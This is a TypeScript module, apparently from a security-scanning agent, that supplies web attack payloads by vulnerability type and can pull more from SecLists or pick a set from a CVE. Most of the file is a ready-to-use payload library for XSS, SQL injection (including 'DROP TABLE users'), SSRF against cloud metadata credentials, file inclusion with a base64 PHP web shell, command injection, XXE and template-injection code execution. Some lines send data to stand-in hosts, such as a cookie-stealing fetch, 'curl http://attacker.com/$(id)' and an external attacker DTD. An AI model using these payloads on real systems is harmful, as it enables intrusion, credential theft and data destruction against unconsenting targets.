import { logger } from "./logger";

const UA = "DevNox-SecAgent/2.0";

async function fetchWithTimeout(url: string, ms = 8000): Promise<Response> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  try { return await fetch(url, { headers: { "User-Agent": UA }, signal: ctrl.signal }); }
  finally { clearTimeout(t); }
}

// ─── Hardcoded real payloads (always available, no network needed) ─────────────

const BUILTIN_PAYLOADS: Record<string, string[]> = {
  xss: [
    `<script>alert(1)</script>`,
    `"><script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<svg onload=alert(1)>`,
    `'"><svg/onload=alert(1)>`,
    `javascript:alert(1)`,
    `<iframe src="javascript:alert(1)">`,
    `<body onload=alert(1)>`,
    `<details open ontoggle=alert(1)>`,
    `"><img src=1 onerror=alert(document.domain)>`,
    `<script>fetch('https://xss.test?c='+document.cookie)</script>`,
    `<input autofocus onfocus=alert(1)>`,
    `<select autofocus onfocus=alert(1)>`,
    `<textarea autofocus onfocus=alert(1)>`,
    `<keygen autofocus onfocus=alert(1)>`,
    `<video><source onerror=alert(1)>`,
    `<audio src=x onerror=alert(1)>`,
    `<object data="javascript:alert(1)">`,
    `<math><mtext></table><img src=x onerror=alert(1)>`,
    `%3Cscript%3Ealert(1)%3C/script%3E`,
    `&lt;script&gt;alert(1)&lt;/script&gt;`,
    `<ScRiPt>alert(1)</ScRiPt>`,
    `<script/src=//xss.rocks/xss.js>`,
    `<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">`,
    `<svg><script>alert(1)</script></svg>`,
  ],
  sqli: [
    `'`,
    `''`,
    `' OR '1'='1`,
    `' OR 1=1--`,
    `' OR 1=1#`,
    `admin'--`,
    `' OR 'x'='x`,
    `') OR ('1'='1`,
    `1' AND SLEEP(5)--`,
    `1; WAITFOR DELAY '0:0:5'--`,
    `' UNION SELECT NULL--`,
    `' UNION SELECT NULL,NULL--`,
    `' UNION SELECT NULL,NULL,NULL--`,
    `' UNION SELECT username,password FROM users--`,
    `'; DROP TABLE users--`,
    `1' AND (SELECT 2 FROM (SELECT(SLEEP(5)))a)--`,
    `' AND 1=2 UNION SELECT 1,2,3--`,
    `' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
    `1 AND 1=1`,
    `1 AND 1=2`,
    `1' ORDER BY 1--`,
    `1' ORDER BY 2--`,
    `1' ORDER BY 3--`,
    `' GROUP BY columnnames having 1=1--`,
    `-1' UNION SELECT 1,2,3--`,
    `1; SELECT * FROM information_schema.tables--`,
    `' OR 1=1 LIMIT 1--`,
    `\x27 OR 1=1`,
    `%27 OR 1=1`,
    `1' AND '1'='1`,
    `1' AND '1'='2`,
  ],
  ssrf: [
    `http://127.0.0.1`,
    `http://localhost`,
    `http://0.0.0.0`,
    `http://[::1]`,
    `http://169.254.169.254/latest/meta-data/`,
    `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    `http://169.254.169.254/latest/user-data`,
    `http://metadata.google.internal/computeMetadata/v1/`,
    `http://169.254.169.254/metadata/v1/`,
    `http://192.168.0.1`,
    `http://10.0.0.1`,
    `http://172.16.0.1`,
    `file:///etc/passwd`,
    `file:///etc/shadow`,
    `file:///proc/self/environ`,
    `dict://127.0.0.1:6379/info`,
    `gopher://127.0.0.1:6379/_INFO`,
    `http://0177.0.0.1/`,
    `http://0x7f000001/`,
    `http://2130706433/`,
    `http://127.1/`,
    `http://127.0.1/`,
    `http://localhost:22`,
    `http://localhost:3306`,
    `http://localhost:5432`,
    `http://localhost:6379`,
    `http://localhost:27017`,
    `http://localhost:9200`,
    `http://localhost:8080/admin`,
  ],
  lfi: [
    `../etc/passwd`,
    `../../etc/passwd`,
    `../../../etc/passwd`,
    `../../../../etc/passwd`,
    `../../../../../etc/passwd`,
    `../../../../../../etc/passwd`,
    `../../../../../../../etc/passwd`,
    `../../../../../../../../etc/passwd`,
    `....//....//etc/passwd`,
    `....//....//....//etc/passwd`,
    `%2e%2e%2fetc%2fpasswd`,
    `%2e%2e/%2e%2e/etc/passwd`,
    `..%2fetc%2fpasswd`,
    `..%252fetc%252fpasswd`,
    `/etc/passwd`,
    `/etc/shadow`,
    `/etc/hosts`,
    `/proc/self/environ`,
    `/proc/self/cmdline`,
    `/proc/version`,
    `php://filter/convert.base64-encode/resource=../config.php`,
    `php://filter/read=convert.base64-encode/resource=index.php`,
    `php://input`,
    `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
    `expect://id`,
    `C:\\Windows\\System32\\drivers\\etc\\hosts`,
    `C:\\boot.ini`,
    `..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts`,
  ],
  cmdi: [
    `; id`,
    `| id`,
    `|| id`,
    `& id`,
    `&& id`,
    `$(id)`,
    "`id`",
    `; cat /etc/passwd`,
    `| cat /etc/passwd`,
    `; whoami`,
    `| whoami`,
    `; ls -la`,
    `; uname -a`,
    `; ifconfig`,
    `; netstat -an`,
    `$(cat /etc/passwd)`,
    `; ping -c 1 127.0.0.1`,
    `| ping -c 1 127.0.0.1`,
    `; sleep 5`,
    `| sleep 5`,
    `$(sleep 5)`,
    `; curl http://attacker.com/$(id)`,
    `\n/bin/sh\n`,
    `%0a id %0a`,
    `%0d%0a id`,
    `127.0.0.1; id`,
    `127.0.0.1 | id`,
    `127.0.0.1 && id`,
  ],
  xxe: [
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`,
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>`,
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>`,
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root/>`,
    `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,
  ],
  ssti: [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "{{config}}",
    "{{self}}",
    "{{request}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{% endif %}{% endfor %}",
    "{{7*'7'}}",
    "${{7*7}}",
    "#{7*7}",
    "@(7+7)",
    "#set($x=7*7)$x",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>exec_id",
    "[#assign ex = 'freemarker.template.utility.Execute'?new()]exec_id",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
    "{{app.request.server.all|join(',')}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
  ],
  open_redirect: [
    `//evil.com`,
    `https://evil.com`,
    `//evil.com/%2F..`,
    `https://evil.com/`,
    `//google.com`,
    `///evil.com`,
    `////evil.com`,
    `/\\evil.com`,
    `//evil.com/..`,
    `https:evil.com`,
    `//evil%E3%80%82com`,
    `javascript:alert(1)`,
    `data:text/html,<script>alert(1)</script>`,
    `%2F%2Fevil.com`,
    `%5C%5Cevil.com`,
    `//evil.com@trusted.com`,
    `https://trusted.com.evil.com`,
    `https://evil.com?trusted.com`,
    `https://evil.com#trusted.com`,
    `//evil.com%00.trusted.com`,
  ],
  auth_bypass: [
    `' OR '1'='1`,
    `' OR 1=1--`,
    `admin'--`,
    `' OR 'x'='x`,
    `') OR ('1'='1`,
    `admin' #`,
    `' OR 1=1/*`,
    `admin'/*`,
    `' OR 1=1 LIMIT 1--`,
    `{"$gt": ""}`,
    `{"$ne": null}`,
    `{"$regex": ".*"}`,
    `{"$where": "1==1"}`,
    `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`,
    `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.`,
    `admin`,
    `admin:admin`,
    `admin:password`,
    `admin:123456`,
    `root:root`,
    `test:test`,
    `guest:guest`,
    `administrator:administrator`,
  ],
  idor: [
    `1`, `2`, `3`, `4`, `5`, `0`, `-1`, `100`, `1000`, `9999`,
    `admin`, `administrator`, `root`, `superuser`,
    `00000000-0000-0000-0000-000000000001`,
    `00000000-0000-0000-0000-000000000002`,
    `../1`, `../2`, `../../1`,
    `1%00`, `1 `, ` 1`,
    `1.0`, `1e0`,
    `0x1`, `0x2`,
    `%31`, `%32`,
  ],
  fuzzing: [
    `null`, `undefined`, `NaN`, `Infinity`, `-Infinity`,
    `0`, `-1`, `1`, `999999999`, `-999999999`,
    `true`, `false`,
    `[]`, `{}`, `""`, `''`,
    `<>`, `<script>`, `</script>`,
    `%00`, `\x00`, `\n`, `\r\n`,
    `../`, `..\\`, `....//`,
    `'`, `"`, "`", `\\`,
    "${7*7}", "{{7*7}}", "<%=7*7%>",
    `; id`, `| id`, `& id`,
    `<img src=x>`, `<svg>`, `<iframe>`,
    `SELECT 1`, `UNION SELECT`, `DROP TABLE`,
    `http://localhost`, `file:///etc/passwd`,
    "A".repeat(100), "A".repeat(1000),
    `%27`, `%22`, `%3C`, `%3E`,
    `\u0000`, `\u0027`, `\u003c`,
  ],
};

// ─── GitHub raw URLs (try these, fallback to builtin) ─────────────────────────

const SECLISTS_BASE = "https://raw.githubusercontent.com/danielmiessler/SecLists/master";

const REMOTE_SOURCES: Record<string, string[]> = {
  xss: [
    `${SECLISTS_BASE}/Fuzzing/XSS/XSS-Jhaddix.txt`,
    `${SECLISTS_BASE}/Fuzzing/XSS/XSS-RSNAKE.txt`,
  ],
  sqli: [
    `${SECLISTS_BASE}/Fuzzing/SQLi/Generic-SQLi.txt`,
    `${SECLISTS_BASE}/Fuzzing/SQLi/quick-SQLi.txt`,
  ],
  lfi: [
    `${SECLISTS_BASE}/Fuzzing/LFI/LFI-Jhaddix.txt`,
  ],
  fuzzing: [
    `${SECLISTS_BASE}/Fuzzing/fuzz-Bo0oM.txt`,
  ],
};

const payloadCache = new Map<string, string[]>();

export async function fetchPayloads(vulnType: string, limit = 100): Promise<string[]> {
  const key = vulnType.toLowerCase().replace(/[^a-z_]/g, "");

  if (payloadCache.has(key)) {
    return payloadCache.get(key)!.slice(0, limit);
  }

  // Start with builtin payloads
  const builtin = BUILTIN_PAYLOADS[key] || BUILTIN_PAYLOADS["fuzzing"] || [];
  const allPayloads: string[] = [...builtin];

  // Try to fetch more from SecLists
  const sources = REMOTE_SOURCES[key] || [];
  for (const url of sources) {
    try {
      const res = await fetchWithTimeout(url, 8000);
      if (!res.ok) continue;
      const text = await res.text();
      const lines = text.split("\n")
        .map(l => l.trim())
        .filter(l => l && !l.startsWith("#") && l.length > 0 && l.length < 500);
      allPayloads.push(...lines);
      logger.info({ url, count: lines.length }, "Loaded payloads from SecLists");
      if (allPayloads.length >= limit * 2) break;
    } catch (err) {
      logger.warn({ err, url }, "Remote payload fetch failed — using builtin");
    }
  }

  const unique = [...new Set(allPayloads)].slice(0, limit * 2);
  payloadCache.set(key, unique);
  logger.info({ vulnType: key, total: unique.length, builtin: builtin.length }, "Payloads ready");
  return unique.slice(0, limit);
}

export function cveToVulnType(cveDescription: string): string {
  const desc = cveDescription.toLowerCase();
  if (desc.includes("sql injection") || desc.includes("sqli")) return "sqli";
  if (desc.includes("cross-site scripting") || desc.includes("xss")) return "xss";
  if (desc.includes("server-side request forgery") || desc.includes("ssrf")) return "ssrf";
  if (desc.includes("remote code execution") || desc.includes("rce") || desc.includes("command injection")) return "cmdi";
  if (desc.includes("path traversal") || desc.includes("directory traversal") || desc.includes("local file inclusion") || desc.includes("lfi")) return "lfi";
  if (desc.includes("xml external entity") || desc.includes("xxe")) return "xxe";
  if (desc.includes("template injection") || desc.includes("ssti")) return "ssti";
  if (desc.includes("open redirect")) return "open_redirect";
  if (desc.includes("authentication bypass") || desc.includes("auth bypass")) return "auth_bypass";
  if (desc.includes("insecure direct object") || desc.includes("idor")) return "idor";
  return "fuzzing";
}

export async function getPayloadsForCVE(cveId: string): Promise<{ vulnType: string; payloads: string[] }> {
  try {
    const res = await fetchWithTimeout(`https://cve.circl.lu/api/cve/${cveId}`, 8000);
    if (!res.ok) throw new Error("CVE not found");
    const data = await res.json() as Record<string, unknown>;
    const summary = String(data["summary"] || "");
    const vulnType = cveToVulnType(summary);
    const payloads = await fetchPayloads(vulnType, 50);
    return { vulnType, payloads };
  } catch {
    return { vulnType: "fuzzing", payloads: await fetchPayloads("fuzzing", 50) };
  }
}

export async function getPayloadsForTechStack(
  techStack: string[],
  vulnType?: string
): Promise<{ source: string; vulnType: string; payloads: string[]; cves: string[] }> {
  const cves: string[] = [];
  if (techStack.length > 0) {
    try {
      const res = await fetchWithTimeout(
        `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(techStack[0])}&resultsPerPage=5`,
        10000
      );
      if (res.ok) {
        const data = await res.json() as Record<string, unknown>;
        const vulns = (data["vulnerabilities"] as Record<string, unknown>[]) || [];
        for (const v of vulns) {
          const cveItem = v["cve"] as Record<string, unknown>;
          cves.push(String(cveItem["id"] || ""));
        }
      }
    } catch { }
  }
  const type = vulnType || "fuzzing";
  const payloads = await fetchPayloads(type, 100);
  return { source: "Builtin + SecLists", vulnType: type, payloads, cves: cves.slice(0, 5) };
}

export const VULN_TYPES = Object.keys(BUILTIN_PAYLOADS);
